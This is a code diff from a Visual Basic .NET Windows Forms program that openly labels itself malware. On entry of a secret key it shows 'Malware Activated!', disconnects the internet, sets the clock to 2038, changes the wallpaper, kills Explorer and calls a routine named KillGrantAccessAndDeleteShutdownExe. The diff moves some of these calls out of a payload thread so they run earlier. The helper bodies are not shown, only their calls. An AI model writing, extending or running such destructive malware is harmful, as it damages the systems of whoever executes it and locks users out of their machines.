@@ -1324,11 +1324,37 @@ Public Class Form1
         If inputTextBox.Text = secretKey Then
             MessageBox.Show("Malware Activated!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information)
 
+            ' Disable the Exit and Activate buttons on the main UI thread
+            If ExitButton.InvokeRequired Then
+                ExitButton.Invoke(Sub()
+                                      ExitButton.Enabled = False
+                                      ActivateButton.Enabled = False
+                                  End Sub)
+            Else
+                ExitButton.Enabled = False
+                ActivateButton.Enabled = False
+            End If
+
             ' 1. Disconnect the Internet
             DisconnectInternet()
 
             ' 2. Set the system time to 2038
             SetSystemTimeTo2038()
+
+            ' Execute remaining operations with individual Try...Catch blocks
+            Try
+                SetWallpaper()
+            Catch ex As Exception
+                ' Log or handle exception for SetWallpaper
+                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
+            End Try
+
+            Try
+                KillExplorerAndMore()
+            Catch ex As Exception
+                ' Log or handle exception for KillExplorerAndMore
+                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
+            End Try
 
             ' Start the operations in a new thread
             Dim thread As New Thread(AddressOf ExecutePayload)
@@ -1375,31 +1401,6 @@ Public Class Form1
     Private Sub ExecutePayload()
 
         Try
-            ' Disable the Exit and Activate buttons on the main UI thread
-            If ExitButton.InvokeRequired Then
-                ExitButton.Invoke(Sub()
-                                      ExitButton.Enabled = False
-                                      ActivateButton.Enabled = False
-                                  End Sub)
-            Else
-                ExitButton.Enabled = False
-                ActivateButton.Enabled = False
-            End If
-
-            ' Execute remaining operations with individual Try...Catch blocks
-            Try
-                SetWallpaper()
-            Catch ex As Exception
-                ' Log or handle exception for SetWallpaper
-                Console.WriteLine("Error in SetWallpaper: " & ex.Message)
-            End Try
-
-            Try
-                KillExplorerAndMore()
-            Catch ex As Exception
-                ' Log or handle exception for KillExplorerAndMore
-                Console.WriteLine("Error in KillExplorerAndMore: " & ex.Message)
-            End Try
 
             Try
                 KillGrantAccessAndDeleteShutdownExe()
